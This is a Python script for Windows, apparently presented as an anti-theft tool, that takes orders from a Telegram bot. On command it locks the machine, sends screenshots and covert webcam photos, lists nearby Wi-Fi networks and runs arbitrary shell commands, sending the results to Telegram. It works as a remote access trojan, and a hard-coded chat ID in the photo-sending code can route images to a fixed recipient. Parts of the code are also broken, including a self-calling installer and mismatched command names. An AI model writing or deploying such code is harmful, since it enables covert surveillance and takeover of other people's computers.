#Standard libraries
import ctypes
import requests
import subprocess
import sys
import os
import random
import time
import socket
from tkinter import *
import tkinter.font as font



#Check for wifi connection

def is_connected():
    """Checks if there is an available wifi connection, and returns True or False"""
    try:
        # connect to the host -- tells us if the host is actually
        # reachable
        socket.create_connection(("www.google.com", 80))
        return True
    except OSError:
        pass
    return False

def connection_loop():
    """Waiting for connection"""
    while not is_connected():
        time.sleep(2)  #no wifi connection, wait 2 seconds before trying to check if there is a connection
        #only continue with the script if there is an internet conenction

connection_loop()

#install non standard librarie
def install():
    """Checks if all the necessary packages are installed, and if not it will install them"""
    print("hello")
    modules = ("requests","python-telegram-bot", "pyautogui", "ecapture")
    try:
        import requests
        import pyautogui
        from ecapture import ecapture as ec
        import telegram
    except:
        for package in modules:
            try:
                install(e)
                subprocess.call([sys.executable, "-m", "pip3", "install", package])
            except:
                print("Unable to download all libraries, some features might not work correctly")
install()

import requests
import pyautogui
from ecapture import ecapture as ec
import telegram

'''
commands:
    lock                - Locks the computer
    screenshot          - Send a screenshot of the computer
    randmouse           - Makes the mouse do random moves
    photo               - Tries to use the webcam to take a photo and send it
    ssids               - Return all available ssids
    STOLE               - Create a window saying the computer has been lost or stolen
    cmd                 - execute some simple cmd commands and get the output
'''


lastMessage = 119801179        #Used to check if  the message received hasent been read already

def parse_cred():
    """Gets the bottoken and chatid from the credential file"""
    file_name = "credential.txt"
    with open(file_name, "r", encoding="UTF-8") as file:
        lines = file.readlines()
    bot_token = lines[0]
    chatID = lines[1]

    return bot_token, chatID

def telegram_bot_sendtext(bot_message):
    """Receives the message for the bot to send, and sends it to the bot specified below"""
    is_connected()
    bot_token, bot_chatID = parse_cred()
    send_text = 'https://api.telegram.org/bot' + bot_token + '/sendMessage?chat_id=' + bot_chatID + '&parse_mode=Markdown&text=' + bot_message

    response = requests.get(send_text)

    return response.json()

def receive_bot_message():
    """Receives the messages coming from the user and makes sure that messages are not read twice"""
    global lastMessage
    is_connected()
    currentMessage = ''

    bot_token, bot_chatID = parse_cred()
    link = "https://api.telegram.org/bot" + bot_token + "/getUpdates"
    response = requests.get(link)    #get the json data from the link
    response = response.json()


    response = response['result']   #go to the result part of the dictionary
    response = response[-1]         #go to the last sent message
    currentMessage = response['update_id']  #get the message code to check if we are not repeating messages
    message = response['message']
    message = message['text']
    if not currentMessage == lastMessage:
        lastMessage = currentMessage
        return message
    else:
        return False

def random_mouse():
    """When called, moves the mouse 50 times to random position inside the screen every quarter of a second"""
    timer = 0
    while timer < 50:
        height, width = pyautogui.size()
        x = random.randint(0,height)
        y = random.randint(0,width)
        pyautogui.moveTo(x,y)
        timer += 1
        time.sleep(0.25)
    return

def send_photo(photo):      #sends a photo and delets it afterwards
    is_connected()
    token, chatID = parse_cred()
    bot = telegram.Bot(token=token)  # Start the telegram API
    bot.send_document("704055948", document=open(photo, 'rb'))  # Send the image
    os.remove(photo)  # delete file
    telegram_bot_sendtext("File deleted")

def findWifi():
    results = subprocess.check_output(["netsh", "wlan", "show", "network"])
    results = results.decode("ascii")  # needed in python 3
    results = results.replace("\r", "")
    ls = results.split("\n")
    ls = ls[4:]
    ssids = []
    x = 0
    if len(ls) == 0:
        telegram_bot_sendtext("No ssids found")
        return
    while x < len(ls):
        if x % 5 == 0:
            ssids.append(ls[x])
        x += 1
    for e in ssids:
        telegram_bot_sendtext(e)
        print(e)


print("program started")
while True:
    mss = receive_bot_message()     #Grab the first message
    while mss == False:             #Wait for new messages to come in
        mss = receive_bot_message()

    #start action verificiation
    if mss == 'lock':   #lock the computer
        ctypes.windll.user32.LockWorkStation()
        telegram_bot_sendtext("Computer Locked")

    if mss == 'screenshot':     #take a screenshot and send it to telegram
        pyautogui.screenshot("foo.png")                         #Capture the screenshot
        send_photo("foo.png")

    if mss == "randmouse":     #random mouse movements
        print("random mouse")
        telegram_bot_sendtext("starting random mouse")
        random_mouse()
        telegram_bot_sendtext("done with random mouse")

    if mss == "photo":        #take a picture
        try:
            ec.capture(0, False, "img.jpg")        #Try to take a picture, if not send a warning message
            send_photo("img.jpg")
        except:
            telegram_bot_sendtext("No camera detected")

    if mss == "ssids":
        telegram_bot_sendtext("looking for wifis...")
        findWifi()
    if mss == "STOLEN":
        os.system('python Testing.py')
        telegram_bot_sendtext("Message Sent")


    #More complicated commands
    splited = mss.split(",")
    if splited[0] == "cmd":                 #Execute commands on cmd
        telegram_bot_sendtext("Executing command")
        try:
            result = subprocess.run([splited[1]], stdout=subprocess.PIPE)
            message = str(result.stdout)
            telegram_bot_sendtext(message)
            telegram_bot_sendtext("Command executed succesfully")
        except:
            telegram_bot_sendtext("Unable to execute command")


